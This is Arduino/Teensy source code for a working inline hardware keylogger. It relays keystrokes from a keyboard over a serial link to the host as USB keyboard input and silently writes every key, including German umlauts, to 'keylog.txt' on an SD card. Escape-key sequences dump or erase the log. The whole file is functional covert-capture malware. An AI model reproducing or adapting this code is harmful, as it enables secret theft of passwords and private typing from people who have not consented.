#include "Keyboard.h"
#include <SD.h>
#include <SPI.h>
#define HWSERIAL Serial1
int y = 0;
int x = 0;
int incomingByte;
char z [] = { ']','@','~', '\\','}', '[', '{','|'};    
int z2;//x
int c=0;
int c2 = 0;
int counter = 0;
int backspace = 0;
int Enter = 0;
char ascii [] = {' ', '!','\x8E','X', '$', '%', '/','\x84',')','=','(','+',',','\xE1', '.', '-', '0',   
                 '1', '2', '3', '4','5','6','7', '8', '9','\x81', '\x94',
    ';', '=', ':','_', '"','A','B','C','D','E','F','G','H','I',
    'J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y',
    'Z', '\x81', '#', '+', '&', '?', '\'', 'a','b', 'c','d', 'e','f',
    'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's',
    't', 'u', 'v', 'w','x', 'z', 'y', '\x9A', '\'', '*', '\'', '@' };
  
int chipSelect = 20;


void setup() {

  Serial.begin(9600);
  HWSERIAL.begin(9600);
  Keyboard.begin();
   

}


void loop() {

  int ib2;
  anf:
 while(true)
 {
  
  if(HWSERIAL.available() > 0 )
  {
    
    incomingByte = HWSERIAL.read();
    //Serial.println(incomingByte);
     if((incomingByte == 27) || (x==1))
     {
        if(((incomingByte == 27) && (x == 0))|| (x==1))
    { x++;

     if( x == 2)
     {


       switch(incomingByte)
       {
          case 57:
                    Keyboard.print("+");
                    x = 0;
                    c =1;
                    c2 = 0;
                    y = 0;
                    goto start2; //break;
          case 67: Serial.println("DELETED :");
                   delete2();
                   x = 0;
                   goto start2;          
                                // break;
          case 16:  Keyboard.print("@");
                    c =1;
                    x=0;
                    c2 =1;
                    y = 0;
                    goto start2;  //break;
          case 45:        //Serial.println(";");
                          Keyboard.print(";");
                          x = 0;
                          y = 0;
                          c = 1;
                          c2 = 3;
                          goto start2;            
                               // break;
          case 55:  Keyboard.print("{");
                    x = 0;
                    y = 0;
                    c = 1;
                    c2 = 6;
                    goto start2; // break;
          case 92: //Serial.println("WUUHUUU");  
                  Keyboard.print(":");
                    x = 0;
                    y = 0;
                    c = 1;
                    c2 = 7;
                    goto start2;  // break;
          case 48:        Keyboard.print("=");
                          x = 0;
                          y = 0;
                          c = 1;
                          c2 = 4;
                          goto start2;
                                // break;
          case 56:        Keyboard.print("[");
                          x = 0;
                          y = 0;
                          c = 1;
                          c2 = 5;
                          goto start2;         
                                // break;
          case 93: 
                          Keyboard.write(39);
                          c = 1;
                          x=0;
                          c2 = 2;
                          y = 0;
                         goto start2;       
                                // break;
          case 72:  
                          Keyboard.press(KEY_UP);
                          Keyboard.release(KEY_UP);
                          x=0;
                          y = 0;
                          goto start2;
                                // break;
          case 75: 
                            Keyboard.press(KEY_LEFT);
                            Keyboard.release(KEY_LEFT);      
                            x=0;
                            y = 0;
                            goto start2;
                            // break;
          case 77:      
                           Keyboard.press(KEY_RIGHT);
                           Keyboard.release(KEY_RIGHT);
                           x=0;
                           y = 0;
                           goto start2;
                            // break;
          case 80: 
          
                           Keyboard.press(KEY_DOWN);
                           Keyboard.release(KEY_DOWN);
                           x=0;
                           y = 0;
                           goto start2;
                           // break;
       }







      
     }

     
    }
    else {

       x = 0;
    }
     
      while(escape())
      {y++;
       if( y > 3)
          y = 0;
       
       if(y == 3)
       {
       y = 0;
      
       
        Serial.println("READING: ");
        read1();
        break;
       }
       
       
      }
      
      break; 
     }
     y = 0;

    switch(incomingByte)
    {
      case 8: 
            Keyboard.press(KEY_BACKSPACE);
            Keyboard.release(KEY_BACKSPACE);
            //backspace = 1;
      break;  //break;
      case 13:  
              Keyboard.press(KEY_ENTER);
              Keyboard.release(KEY_ENTER);
           // Enter = 1;
      break;
      case 59:  Keyboard.print("ö");
              c =1;
              c2 = 8;
              y = 0;
      goto start2; //break;
      case 58:  Keyboard.print("Ö");
              c = 1;
              c2 = 9;
              y = 0;
      goto start2; break;
      case 39: Keyboard.print("ä");
              c =1;
              c2 = 10;
              y = 0;
      goto start2; // break;  
      case 64: Keyboard.print("Ä");
              c =1;
              c2 = 11;
              y = 0;
      goto start2; //break;
      case 91: Keyboard.print("ü");
             c =1;
            c2 = 12;
            y = 0;
      goto start2; //break;
      case 123:   Keyboard.print("Ü");
          c =1;
          c2 = 13;
          y = 0;
      goto start2;  //break;
      case 45: Keyboard.print("ß");
                c = 1;
                c2 = 14;
                y = 0;
               goto start2;
               //break;
      case 61: Keyboard.print("`"); break;
      
        
    }

    
    ib2 = incomingByte - 32;
   
   
    //Serial.println("EXE");
    Keyboard.write(incomingByte);
   
    //Serial.println(" ");
  start2:
    //Serial.print("Initializing SD card...");
    if (!SD.begin(chipSelect)) {
  //  Serial.println("Card failed, or not present");
 //    don't do anything more:
    return;
  }
  //Serial.println("card initialized.");
  File dataFile = SD.open("keylog.txt", FILE_WRITE);
  if (dataFile)
  {
 
    if(c==0)
    {
     
    dataFile.print(ascii[ib2]);
    c = 0; 
    
    
    }
    else 
    {
      
    if(c2 > 7)
    {
      
      switch(c2)
      {
         case 8: dataFile.print("ö"); break;
         case 9: dataFile.print("Ö"); break;
         case 10: dataFile.print("ä"); break;
         case 11: dataFile.print("Ä"); break;
         case 12: dataFile.print("ü"); break;
         case 13: dataFile.print("Ü"); break;
         case 14: dataFile.print("ß"); break;
      }
    }
    
      else {

        dataFile.print(z[c2]);
      }
    
    c2 = 0;
    c =0;
      
    }
    
    dataFile.close();
    break;
  }
  else {
    Serial.println("error opening keylog.txt"); 
    break;
  }
  break;
  }
   }

    
    
  
  
  // put your main code here, to run repeatedly:

}


void read1()
{

    File dataFile = SD.open("keylog.txt", FILE_READ);
    
    while (dataFile.available()) {
       counter++;    
       char y = dataFile.read();

   
      Serial.print(y);
      if(counter==100)
      {
        Serial.println("");
        counter = 0;
      }
    }
    counter = 0;
}

void delete2()
{
  SD.remove("keylog.txt");
}
boolean escape()
{

 
  if(incomingByte != 27)
  {
   
    return false;
  }

  incomingByte = HWSERIAL.read();

  return true;
}

    
  
